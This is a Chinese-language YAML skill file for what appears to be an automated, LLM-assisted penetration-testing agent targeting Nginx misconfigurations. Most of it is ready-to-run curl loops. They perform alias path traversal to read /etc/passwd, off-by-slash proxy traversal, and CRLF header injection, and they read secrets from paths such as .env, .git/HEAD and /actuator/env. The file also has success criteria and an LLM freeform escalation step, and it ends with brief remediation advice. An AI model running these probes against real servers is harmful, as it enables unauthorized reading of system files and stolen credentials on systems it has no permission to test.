# ═══════════════════════════════════════════════════════════
# Nginx 配置漏洞利用
#
# 原理: Nginx 配置错误导致路径穿越、信息泄露、SSRF 等
# 覆盖: alias 穿越、off-by-slash、CRLF 注入、目录遍历、
#       反向代理 SSRF、HTTP 请求走私
# 特点: 不是代码漏洞，而是配置错误，需要逐项探测
# ═══════════════════════════════════════════════════════════
skill_id: nginx_misconfig
name: "Nginx 配置漏洞利用"
category: server_misconfig
phase: foothold
version: "1.0"

principle: |
  Nginx 本身很少有代码级漏洞，但配置错误非常常见：
  
  1. alias 路径穿越:
     location /files { alias /data/; }
     访问 /files../etc/passwd 时，alias 拼接为 /data/../etc/passwd
     实际读取 /etc/passwd。根因是 location 路径末尾没有 /。
  
  2. off-by-slash (location 与 proxy_pass):
     location /api { proxy_pass http://backend/; }
     访问 /api../secret 会被代理到 http://backend/../secret
     导致后端路径穿越。
  
  3. CRLF 注入 (Header injection):
     当 Nginx 将 URL 参数反射到响应头时（如 $uri 用在 return 中），
     注入 %0d%0a 可插入任意响应头或响应体。
  
  4. 目录遍历 (autoindex):
     autoindex on 配置导致目录列表泄露。
  
  5. 配置文件泄露:
     /nginx.conf, /.nginx.conf, /server-status 等敏感路径。
  
  6. 反向代理 SSRF:
     proxy_pass 配置允许攻击者控制目标地址时（如参数拼接），
     可请求内网服务。

match:
  rules:
    - fingerprint_contains: ["nginx"]
    - fingerprint_contains: ["Nginx"]
    - evidence_contains: ["nginx"]
    - service_is: "http"

probes:
  - id: confirm_nginx
    description: "确认 Nginx 并获取版本"
    command: |
      curl -s -D - {ENDPOINT} -o /dev/null --max-time 10
    parse_rules:
      - if_regex: "[Nn]ginx/?([\\d.]*)"
        set: { nginx_confirmed: true }
      - if_contains: ["nginx"]
        set: { nginx_confirmed: true }

  - id: scan_sensitive_paths
    description: "探测 Nginx 相关敏感路径"
    depends_on: { nginx_confirmed: true }
    steps:
      - command: |
          for path in /nginx.conf /.nginx.conf /nginx_status /server-status \
                      /status /basic_status /.git/HEAD /.env /.DS_Store \
                      /WEB-INF/web.xml /actuator/env; do
            code=$(curl -s -o /dev/null -w "%{http_code}" "{ENDPOINT}${path}" --max-time 5 2>/dev/null)
            if [ "$code" = "200" ]; then
              echo "SENSITIVE_PATH:${path}:${code}"
            fi
          done
        parse_rules:
          - if_contains: ["SENSITIVE_PATH"]
            set: { sensitive_paths_found: true }

      # autoindex 目录遍历检测
      - command: |
          for path in / /files/ /uploads/ /static/ /images/ /data/ /backup/; do
            content=$(curl -s "{ENDPOINT}${path}" --max-time 5 2>/dev/null)
            if echo "$content" | grep -q "Index of\|Directory listing\|<title>Index"; then
              echo "AUTOINDEX:${path}"
            fi
          done
        parse_rules:
          - if_contains: ["AUTOINDEX"]
            set: { autoindex_found: true }

exploit_paths:
  # ═══ 路径 A: alias 路径穿越 ═══
  - path_id: alias_traversal
    name: "Nginx alias 路径穿越"
    priority: 1
    principle: |
      location /prefix { alias /real/path; } 配置中，
      如果 location 末尾无 /，/prefix../etc/passwd 可穿越读取。
    conditions:
      nginx_confirmed: true
    steps:
      - id: alias_detect
        description: "探测常见 alias 穿越路径"
        command: |
          found=""
          for prefix in /static /files /assets /images /uploads /media /css /js /data; do
            # 先确认路径存在
            code=$(curl -s -o /dev/null -w "%{http_code}" "{ENDPOINT}${prefix}/" --max-time 5)
            if [ "$code" = "200" ] || [ "$code" = "403" ] || [ "$code" = "301" ]; then
              # 尝试穿越
              content=$(curl -s "{ENDPOINT}${prefix}../etc/passwd" --max-time 5)
              if echo "$content" | grep -q "root:"; then
                echo "ALIAS_TRAVERSAL:${prefix}:SUCCESS"
                echo "$content" | head -5
                found="yes"
                break
              fi
              # 多级穿越
              content=$(curl -s "{ENDPOINT}${prefix}../../etc/passwd" --max-time 5)
              if echo "$content" | grep -q "root:"; then
                echo "ALIAS_TRAVERSAL:${prefix}../../:SUCCESS"
                echo "$content" | head -5
                found="yes"
                break
              fi
            fi
          done
          [ -z "$found" ] && echo "NO_ALIAS_TRAVERSAL"
        timeout: 60
        success_criteria:
          stdout_contains_any: ["ALIAS_TRAVERSAL", "root:"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "file_read_alias"

  # ═══ 路径 B: off-by-slash proxy 穿越 ═══
  - path_id: proxy_traversal
    name: "off-by-slash 反向代理穿越"
    priority: 2
    principle: |
      proxy_pass 末尾有 / 但 location 末尾无 / 时，
      可通过 ../ 访问后端非预期路径。
    conditions:
      nginx_confirmed: true
    steps:
      - id: proxy_detect
        description: "探测反向代理穿越"
        command: |
          for prefix in /api /app /backend /proxy /service /internal; do
            code=$(curl -s -o /dev/null -w "%{http_code}" "{ENDPOINT}${prefix}/" --max-time 5)
            if [ "$code" != "000" ] && [ "$code" != "404" ]; then
              # 尝试穿越到根
              content=$(curl -s -D - "{ENDPOINT}${prefix}../" --max-time 5)
              content2=$(curl -s "{ENDPOINT}${prefix}/" --max-time 5)
              # 比较内容长度差异（穿越成功通常返回不同内容）
              len1=${#content}
              len2=${#content2}
              if [ $len1 -ne $len2 ] && [ $len1 -gt 100 ]; then
                echo "PROXY_TRAVERSAL:${prefix}:len_diff=${len1}vs${len2}"
              fi
            fi
          done
        timeout: 60
        success_criteria:
          stdout_contains_any: ["PROXY_TRAVERSAL"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "proxy_traversal"

  # ═══ 路径 C: CRLF 注入 ═══
  - path_id: crlf_injection
    name: "CRLF Header 注入"
    priority: 3
    principle: |
      当 Nginx 将 $uri 或用户参数反射到 HTTP 响应头时（常见于
      301/302 重定向），注入 %0d%0a 可插入任意响应头。
    conditions:
      nginx_confirmed: true
    steps:
      - id: crlf_detect
        description: "在重定向 URL 中注入 CRLF"
        command: |
          # 测试 URL 路径中的 CRLF
          response=$(curl -s -D - "{ENDPOINT}/%0d%0aX-Injected:true" --max-time 10)
          if echo "$response" | grep -qi "X-Injected"; then
            echo "CRLF_PATH_INJECTION"
          fi
          # 测试参数中的 CRLF
          response=$(curl -s -D - "{ENDPOINT}/?redirect=http://example.com%0d%0aX-Injected:true" --max-time 10)
          if echo "$response" | grep -qi "X-Injected"; then
            echo "CRLF_PARAM_INJECTION"
          fi
        timeout: 20
        success_criteria:
          stdout_contains_any: ["CRLF_PATH_INJECTION", "CRLF_PARAM_INJECTION"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "crlf_injection"

  # ═══ 路径 D: 信息泄露汇总 ═══
  - path_id: info_disclosure
    name: "敏感信息泄露"
    priority: 4
    conditions:
      nginx_confirmed: true
      sensitive_paths_found: true
    steps:
      - id: read_sensitive
        description: "读取已发现的敏感文件内容"
        command: |
          for path in /nginx.conf /.env /.git/HEAD /server-status /actuator/env; do
            content=$(curl -s "{ENDPOINT}${path}" --max-time 5 2>/dev/null)
            if [ ${#content} -gt 10 ] && ! echo "$content" | grep -q "404\|Not Found"; then
              echo "=== ${path} ==="
              echo "$content" | head -30
              echo ""
            fi
          done
        timeout: 30
        success_criteria:
          stdout_contains_any: ["server {", "SECRET_KEY", "ref:", "Active connections"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "info_disclosure"

  # ═══ 路径 E: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 4
    conditions:
      nginx_confirmed: true

remediation: |
  1. alias 路径穿越: location 和 alias 路径末尾的 / 必须一致
  2. 关闭 autoindex（除非确实需要）
  3. 不要在 return/rewrite 中使用未过滤的 $uri
  4. 限制敏感路径（.git, .env, nginx.conf）的访问
  5. proxy_pass 使用完整路径，避免 off-by-slash
  6. 保持 Nginx 版本更新
